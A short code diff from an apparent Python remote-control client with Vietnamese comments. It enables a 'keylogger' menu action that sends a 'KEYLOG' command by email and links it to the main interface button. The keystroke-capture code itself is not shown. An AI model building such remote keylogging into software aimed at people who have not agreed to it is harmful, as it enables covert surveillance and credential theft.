@@ -37,10 +37,11 @@ def mac_address():
     mac.mac_address()
     return
 # 2 Lắng nghe phím (Keylogger)
-# def keylogger():
-#     tmp = klc.Keylogger_UI(root, client)
-#     tmp.button_6.configure(command = lambda: back(tmp))
-#     return
+def keylogger():
+    g.send_mail("KEYLOG")
+    tmp = klc.Keylogger_UI(root)
+    tmp.button_6.configure(command = lambda: back(tmp))
+    return
 # 3 Xem cây thư mục (Directory Tree)
 # def back_directory_tree(ui):
 #     ui.place_forget()
@@ -88,7 +89,7 @@ def show_main_ui():
     global f2
     f2 = ui2.Main_UI(root)
     f2.button_mac_addr.configure(command = mac_address)
-    # f2.button_keylogger.configure(command = keylogger)
+    f2.button_keylogger.configure(command = keylogger)
     # f2.button_directory_tree.configure(command = directory_tree)
     # f2.button_livescreen.configure(command = live_screen)
     # f2.button_app_process.configure(command = app_process)    
